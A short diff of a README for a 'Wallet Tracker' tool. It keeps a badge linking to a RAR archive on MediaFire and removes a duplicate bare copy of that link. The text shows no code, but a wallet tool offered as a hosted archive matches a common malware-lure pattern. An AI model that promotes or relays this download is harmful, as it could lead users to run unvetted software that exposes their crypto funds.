@@ -4,7 +4,7 @@
 [![Download Wallet Tracker](https://img.shields.io/badge/Download-Wallet_Tracker_v1.2-blue?style=for-the-badge)](https://www.mediafire.com/file/lldhg2rvtfoox56/Wallet_Tracker.rar/file)  
 
 ![Wallet Tracker](https://i.ibb.co/jTgHCBC/3e.png)
-https://www.mediafire.com/file/lldhg2rvtfoox56/Wallet_Tracker.rar/file
+
 ---
 
 ## Main Purpose  
